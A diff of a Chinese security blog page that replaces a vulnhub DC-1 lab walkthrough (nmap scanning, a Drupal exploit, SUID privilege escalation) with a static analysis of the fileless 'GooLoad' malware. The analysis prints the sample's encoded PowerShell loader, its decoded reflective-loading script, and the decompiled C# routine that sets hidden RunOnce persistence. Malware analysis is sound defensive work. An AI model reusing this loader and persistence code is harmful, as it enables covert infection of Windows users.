@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>vulnhub DC-1 | 九世的博客</title>
-  <meta name="keywords" content=" 靶场 ">
-  <meta name="description" content="vulnhub DC-1 | 九世的博客">
+  <title>无文件GooLoad静态分析 | 九世的博客</title>
+  <meta name="keywords" content=" 恶意分析 ">
+  <meta name="description" content="无文件GooLoad静态分析 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1703,9 +1703,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-vulnhub-DC-1" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-无文件GooLoad静态分析" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">vulnhub DC-1</h1>
+        <h1 class="article-title">无文件GooLoad静态分析</h1>
     
     <div class="article-meta">
         
@@ -1714,14 +1714,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">靶场</a>
+            <a href="javascript:" class="color5">恶意分析</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2020-04-14 23:31:02">2020-04-14 23:09</time>
+        创建时间:<time class="date" title="更新时间: 2021-04-12 19:51:12">2021-04-12 17:33</time>
         
     </div>
     <div class="article-meta">
@@ -1743,7 +1743,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过程"><span class="toc-text">过程</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#分析过程"><span class="toc-text">分析过程</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1758,65 +1758,122 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>翻百度云的时候翻到之前保存的vulnhub的几个靶场，下载来做做</p>
-<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>先找到靶场的IP</p>
-<pre><code>fping -ag 192.168.1.0/24 &gt; jj.txt
-</code></pre><p>最后确认是192.168.1.106，先nmap扫描</p>
-<pre><code>nmap -min-rate 10000 -T5 -A 192.168.1.106
-</code></pre><p><img src="https://s1.ax1x.com/2020/04/14/JpgrIx.md.png" alt=""></p>
-<p>web是Drupal这套CMS<br><img src="https://s1.ax1x.com/2020/04/14/Jpg7Jf.png" alt=""></p>
-<p>whatweb查看了一下</p>
-<pre><code>whatweb https://192.168.1.106
-</code></pre><p><img src="https://s1.ax1x.com/2020/04/14/JpgHW8.png" alt=""></p>
-<p>目前得到的信息</p>
-<pre><code>ip：192.168.1.106
-os:debain
-open Port:
-22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
+        <p>Youtube分析视频:<a href="https://www.youtube.com/watch?v=BcFbkjUVc7o" target="_blank" rel="noopener">https://www.youtube.com/watch?v=BcFbkjUVc7o</a><br>样本下载地址:<a href="https://bazaar.abuse.ch/sample/6bb71d8bf32cceef6a431136e0c965aa905c45c240b40bb20aa6fb6f661300f3" target="_blank" rel="noopener">https://bazaar.abuse.ch/sample/6bb71d8bf32cceef6a431136e0c965aa905c45c240b40bb20aa6fb6f661300f3</a></p>
+<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>md5:1766EFD0E682B405C2A49613DD1B4D81<br>sha1:6A8644B0A41B471D21476FDE2D2C07599943BF55<br>sha256:8D39AA47F437C37451A7D249E5EEE77D1BE6C00C95FAD82D69C119A734F5F4B3</p>
+<p>拿到的是个js，启动用wscript启动。js内容如下<br><img src="https://z3.ax1x.com/2021/04/12/cDuuJx.png" alt=""></p>
+<p>丢到<code>https://lelinhtinh.github.io/de4js/</code>美化一下代码<br><img src="https://z3.ax1x.com/2021/04/12/cDuqt1.png" alt=""></p>
+<p>执行流程如下:<br>1.首先是获取当前用户名称，创建了一个注册表路径:<code>HKEY_CURRENT_USER\SOFTWARE\&lt;USERNAME&gt;</code><br>2.读取ocwbowtyl变量的值长度到4000的时候写入<code>HKEY_CURRENT_USER\SOFTWARE\&lt;USERNAME&gt;\&lt;ltrjrmhvifoz&gt;</code><br>3.写入<code>HKEY_CURRENT_USER\SOFTWARE\&lt;USERNAME&gt;\&lt;ltrjrmhvifoz&gt; value:&lt;gzmttsouj&gt; type:REG_SZ</code><br>4.创建注册表路径<code>HKEY_CURRENT_USER\SOFTWARE\&lt;%USERNAME%1&gt;</code><br>5.gzmttsouj赋值znahht<br>6.读取gzmttsouj变量的值长度到4000的时候写入<code>HKEY_CURRENT_USER\SOFTWARE\&lt;USERNAME&gt;\&lt;ltrjrmhvifoz&gt;</code><br>7.写入<code>HKEY_CURRENT_USER\SOFTWARE\&lt;USERNAME&gt;\&lt;ltrjrmhvifoz&gt; value:&lt;gzmttsouj&gt; type:REG_SZ</code><br>8.判断文件夹(<code>C:\Program Files (x86)</code>)是否存在，决定采用那个powershell执行<br>9.执行powershell command</p>
+<p><img src="https://z3.ax1x.com/2021/04/12/cDKHKS.png" alt=""></p>
+<p><img src="https://z3.ax1x.com/2021/04/12/cDKxCq.png" alt=""></p>
+<p>执行的powershell command<br><img src="https://z3.ax1x.com/2021/04/12/cDMTiR.png" alt=""></p>
+<p>解码如下<br><img src="https://z3.ax1x.com/2021/04/12/cDQRfI.png" alt=""></p>
+<pre><code class="powershell">#cmd /c C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -En &quot;PAAjACAAdQB2AHgAdgByAGwAIAAjAD4AJAB1AD0AJABlAG4AdgA6AFUAcwBlAHIATgBhAG0AZQA7AGYAbwByACAAKAAkAGkAPQAwADsAJABpACAALQBsAGUAIAA3ADAAMAA7ACQAaQArACsAKQB7ACQAYwA9ACIASABLAEMAVQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAIgArACQAdQArACIAMQAiADsAVAByAHkAewAkAGEAPQAkAGEAKwAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAHAAYQB0AGgAIAAkAGMAKQAuACQAaQB9AEMAYQB0AGMAaAB7AH0AfQA7AGYAdQBuAGMAdABpAG8AbgAgAGMAaABiAGEAewBbAGMAbQBkAGwAZQB0AGIAaQBuAGQAaQBuAGcAKAApAF0AcABhAHIAYQBtACgAWwBwAGEAcgBhAG0AZQB0AGUAcgAoAE0AYQBuAGQAYQB0AG8AcgB5AD0AJAB0AHIAdQBlACkAXQBbAFMAdAByAGkAbgBnAF0AJABoAHMAKQA7ACQAQgB5AHQAZQBzACAAPQAgAFsAYgB5AHQAZQBbAF0AXQA6ADoAbgBlAHcAKAAkAGgAcwAuAEwAZQBuAGcAdABoACAALwAgADIAKQA7AGYAbwByACgAJABpAD0AMAA7ACAAJABpACAALQBsAHQAIAAkAGgAcwAuAEwAZQBuAGcAdABoADsAIAAkAGkAKwA9ADIAKQB7ACQAQgB5AHQAZQBzAFsAJABpAC8AMgBdACAAPQAgAFsAYwBvAG4AdgBlAHIAdABdADoAOgBUAG8AQgB5AHQAZQAoACQAaABzAC4AUwB1AGIAcwB0AHIAaQBuAGcAKAAkAGkALAAgADIAKQAsACAAMQA2ACkAfQAkAEIAeQB0AGUAcwB9ADsAJABpACAAPQAgADAAOwBXAGgAaQBsAGUAIAAoACQAVAByAHUAZQApAHsAJABpACsAKwA7ACQAawBvACAAPQAgAFsAbQBhAHQAaABdADoAOgBTAHEAcgB0ACgAJABpACkAOwBpAGYAIAAoACQAawBvACAALQBlAHEAIAAxADAAMAAwACkAewAgAGIAcgBlAGEAawB9AH0AWwBiAHkAdABlAFsAXQBdACQAYgAgAD0AIABjAGgAYgBhACgAJABhAC4AcgBlAHAAbABhAGMAZQAoACIAIwAiACwAJABrAG8AKQApADsAWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGIAKQA7AFsATQBvAGQAZQBdADoAOgBTAGUAdAB1AHAAKAApADsA &quot;
+ &lt; # uvxvrl # &gt;
+$u = $env:UserName;
+for ($i = 0;$i  - le 700;$i++) {
+    $c = &quot;HKCU:\SOFTWARE\&quot;+$u+&quot;1&quot;;
+    Try{
+        $a=$a+(Get-ItemProperty -path $c).$i #获取KCU:\SOFTWARE\&lt;USERNAME&gt;1的所有的键值
+    }Catch{
 
-80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
-|_http-generator: Drupal 7 (http://drupal.org)
-| http-robots.txt: 36 disallowed entries (15 shown)
-| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
-| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
-| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
-|_/LICENSE.txt /MAINTAINERS.txt
-|_http-server-header: Apache/2.2.22 (Debian)
-|_http-title: Welcome to Drupal Site | Drupal Site
+    }
+};
+function chba{
+    #转换为二进制数据
+    [cmdletbinding()]param([parameter(Mandatory=$true)][String]$hs);
+    $Bytes = [byte[]]::new($hs.Length / 2);
+    for($i=0; $i -lt $hs.Length; $i+=2){
+        $Bytes[$i/2] = [convert]::ToByte($hs.Substring($i, 2), 16)
+    }
+    $Bytes
+};
+
+$i = 0;
+While ($True){
+    $i++;
+    $ko = [math]::Sqrt($i);
+    if ($ko -eq 1000){ 
+        break
+    }
+}
+[byte[]]$b = chba($a.replace(&quot;#&quot;, $ko)); #将&quot;#&quot;替换为1000 1000对应十六进制为NULL
+[Reflection.Assembly]::Load($b); #远程加载
+[Mode]::Setup();
+</code></pre>
+<p>powershell执行流程:<br>1.获取<code>KCU:\SOFTWARE\&lt;USERNAME&gt;1的所有的键值</code><br>2.获取到内容将#替换为1000<br>3.远程加载执行<br>4.调用远程加载里的<code>setup</code>函数</p>
+<p>提取znahht变量的内容，将#替换为1000.十六进制解码，丢进dnSpy分析</p>
+<p>md5:404280229BFDBE01D751BCE03210F75E<br>sha1:098B332B7A4F8712916D6A681799E390DAAAEF98<br>sha256:BFFA7EC58ABF9F4AB9940C1633EF86484DFC1425326EC247699BBB2D1C6E45A9</p>
+<p>得到的结果如下</p>
+<pre><code class="csharp">// Mode
+// Token: 0x06000002 RID: 2 RVA: 0x00002104 File Offset: 0x00000304
+public static string Setup()
+{
+    RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(&quot;SOFTWARE\\&quot; + Environment.UserName); //读取HKCU\SOFTWARE\&lt;USERNAME&gt;
+    if (registryKey != null)
+    {
+        string text = &quot;&quot;;
+        for (int i = 0; i &lt; 99999; i++)
+        {
+            string text2 = &quot;&quot;;
+            try
+            {
+                text2 = registryKey.GetValue(i.ToString()).ToString(); //读取从0到99999键名的键值
+            }
+            catch
+            {
+            }
+            if (text2.Length == 0)
+            {
+                break;
+            }
+            text += text2;
+        }
+        registryKey.Close(); //关闭注册表
+        text = text.Replace(&quot;q&quot;, &quot;000&quot;).Replace(&quot;v&quot;, &quot;0&quot;).Replace(&quot;w&quot;, &quot;1&quot;).Replace(&quot;r&quot;, &quot;2&quot;).Replace(&quot;t&quot;, &quot;3&quot;).Replace(&quot;y&quot;, &quot;4&quot;).Replace(&quot;u&quot;, &quot;5&quot;).Replace(&quot;i&quot;, &quot;6&quot;).Replace(&quot;o&quot;, &quot;7&quot;).Replace(&quot;p&quot;, &quot;8&quot;).Replace(&quot;s&quot;, &quot;9&quot;).Replace(&quot;q&quot;, &quot;A&quot;).Replace(&quot;h&quot;, &quot;B&quot;).Replace(&quot;j&quot;, &quot;C&quot;).Replace(&quot;k&quot;, &quot;D&quot;).Replace(&quot;l&quot;, &quot;E&quot;).Replace(&quot;z&quot;, &quot;F&quot;); //将q替换为000，将v替换为0，将w替换为1，将t替换为3，将y替换为4，将u替换为5，将i替换为6，将o替换为7，将p替换为8，将s替换为9，将q替换为A，将h替换为B，将j替换为C，将k替换为D，将l替换为E，将z替换为F
+        byte[] rawAssembly = Mode.STBA(text); //hex转换得到原始数据
+        Assembly assembly = Assembly.Load(rawAssembly); //远程加载
+        Type type = assembly.GetType(&quot;Diagnostics&quot;); //调用Diagnostics
+        object obj = Activator.CreateInstance(type);
+        MethodInfo method = type.GetMethod(&quot;Time&quot;);
+        method.Invoke(obj, null);
+        using (RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce&quot;, true)) //打开HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce注册表
+        {
+            string str = Environment.UserName.Replace(&quot; &quot;, &quot;&quot;); //将本机用户名的空格替换为空
+            registryKey2.SetValue(Environment.UserName, &quot;powershell -Win Hi -Command \&quot;$r = [Environment]::GetEnvironmentVariable(&#39;&quot; + str + &quot;&#39;, &#39;User&#39;).split();$p=$r[0];$r[0]=&#39;&#39;;Start-Process $p -ArgumentList ($r -join &#39; &#39;) -Win Hi\&quot;&quot;); //当前用户作为键名
+        }
+        using (RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey(&quot;Environment&quot;, true)) //打开HKCU\Environment
+        {
+            string text3 = Environment.CommandLine; //获取此过程的命令行(由于是在powershell远程加载的所以这里获取到的是powershell.exe的路径)
+            if (!text3.Contains(&quot;windowstyle&quot;))
+            {
+                text3 = text3.Replace(&quot;.exe &quot;, &quot;.exe -windowstyle hidden &quot;); //执行的命令行存在windowstyle将.exe替换为.exe -windowstyle hidden[空格]
+            }
+            registryKey3.SetValue(Environment.UserName.Replace(&quot; &quot;, &quot;&quot;), text3);
+        }
+    }
+    return &quot;Install&quot;;
+}
 
 
-111/tcp open  rpcbind 2-4 (RPC #100000)
-| rpcinfo: 
-|   program version    port/proto  service
-|   100000  2,3,4        111/tcp   rpcbind
-|   100000  2,3,4        111/udp   rpcbind
-|   100000  3,4          111/tcp6  rpcbind
-|   100000  3,4          111/udp6  rpcbind
-|   100024  1          40475/tcp   status
-|   100024  1          45311/tcp6  status
-|   100024  1          55552/udp6  status
-|_  100024  1          55843/udp   status
 
-web information:
-apache:2.2.22
-cms version:Drupal 7
-php version:php/5.4.45-0+deb7u14
-
-path:
-http://192.168.1.106/user
-http://192.168.1.106/admin
-</code></pre><p>看了一下路径也没啥好整的<br><img src="https://s1.ax1x.com/2020/04/14/Jp2AOJ.md.png" alt=""></p>
-<p>搜索了一下Drupal 7的exp，发现有个SQL注入。通过msf发现有利用exp<br>参考链接：<a href="https://blog.csdn.net/iteye_14261/article/details/82514405" target="_blank" rel="noopener">Drupal 数据库配置连接_数据库_I Am Nothing-CSDN博客</a></p>
-<p><img src="https://s1.ax1x.com/2020/04/14/Jp2J0A.md.png" alt=""></p>
-<p>查看了一下网络连接，发现mysql只有本地能访问<br><img src="https://s1.ax1x.com/2020/04/14/Jp201S.png" alt=""></p>
-<p><img src="https://s1.ax1x.com/2020/04/14/Jp2smj.png" alt=""></p>
-<p>搜索了一下Drupal的数据库配置文件在哪里<br>参考链接：<a href="https://blog.csdn.net/iteye_14261/article/details/82514405" target="_blank" rel="noopener">Drupal 数据库配置连接_数据库_I Am Nothing-CSDN博客</a></p>
-<p><img src="https://s1.ax1x.com/2020/04/14/JpRPAI.png" alt=""></p>
-<p><img src="https://s1.ax1x.com/2020/04/14/JpRF4P.png" alt=""></p>
-<p><img src="https://s1.ax1x.com/2020/04/14/JpRZjg.png" alt=""></p>
-<p><img src="https://s1.ax1x.com/2020/04/14/JpRnBj.png" alt=""></p>
-<p>尝试使用john破解此hash，发现无果。尝试直接提权，sudo -l无结果，find / -perm /4000 2&gt;/dev/null<br><img src="https://s1.ax1x.com/2020/04/14/JpR83T.png" alt=""></p>
-<p>在这里找到提权的方法：<a href="https://gtfobins.github.io/gtfobins/find/" target="_blank" rel="noopener">find | GTFOBins</a><br><img src="https://s1.ax1x.com/2020/04/14/JpRtu4.png" alt=""></p>
+// Mode
+// Token: 0x06000001 RID: 1 RVA: 0x00002098 File Offset: 0x00000298
+public static byte[] STBA(string hex)
+{
+    return (from x in Enumerable.Range(0, hex.Length)
+    where x % 2 == 0
+    select Convert.ToByte(hex.Substring(x, 2), 16)).ToArray&lt;byte&gt;(); //hex转换
+}
+</code></pre>
+<p>md5:FD5B538D2523FEA19D7C11C4159A7EB6<br>sha1:5620A43E87ADB4517AA7181825612CFD7491AF3A<br>sha256:BBE6F87ECBA0F6452C6A7F3A81B6DBEB23787C754439BC979CAF653DC594B606</p>
+<p>1.读取读取HKCU\SOFTWARE\<username>从0到99999键名的键值<br>2.将q替换为000，将v替换为0，将w替换为1，将t替换为3，将y替换为4，将u替换为5，将i替换为6，将o替换为7，将p替换为8，将s替换为9，将q替换为A，将h替换为B，将j替换为C，将k替换为D，将l替换为E，将z替换为F<br>3.hex转换得到原始数据<br>4.远程加载<br>5.调用Diagnostics.Time()<br>6.将此ps1的路径添加到启动路径HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</username></p>
+<p>ocwbowtyl变量值hex解码还原dnSpy分析<br><img src="https://z3.ax1x.com/2021/04/12/cDNy0x.png" alt=""></p>
+<p>分析结果为cs实现的傀儡进程（注入:C:\Program Files (x86)\Windows Photo Viewer\ImagingDevices.exe）<br><img src="https://z3.ax1x.com/2021/04/12/cDN4cd.png" alt=""></p>
+<p>如果失败的话则会杀掉进程<br><img src="https://z3.ax1x.com/2021/04/12/cDNqN8.png" alt=""></p>
+<p>提取注入的PE<br><img src="https://z3.ax1x.com/2021/04/12/cDNX9g.png" alt=""></p>
+<p>ps:提取出来后<code>\s</code>替换为空。然后hex解码，得到PE<br><img src="https://z3.ax1x.com/2021/04/12/cDUPEV.png" alt=""></p>
+<p><img src="https://z3.ax1x.com/2021/04/12/cDUtKA.png" alt=""></p>
+<p>丢沙箱了没见到上线，IDA看了一下也没出什么有用的。具体不知<br><img src="https://z3.ax1x.com/2021/04/12/cD0O6e.png" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1826,12 +1883,12 @@ http://192.168.1.106/admin
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>vulnhub DC-1</p>
+    <p><span class="copy-title">文章标题:</span>无文件GooLoad静态分析</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-04-14, 23:09:16</p>
-    <p><span class="copy-title">最后更新:</span>2020-04-14, 23:31:02</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/4e50c1f3.html" title="vulnhub DC-1">http://422926799.github.io/posts/4e50c1f3.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-04-12, 17:33:30</p>
+    <p><span class="copy-title">最后更新:</span>2021-04-12, 19:51:12</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/9d2ce0c6.html" title="无文件GooLoad静态分析">http://422926799.github.io/posts/9d2ce0c6.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
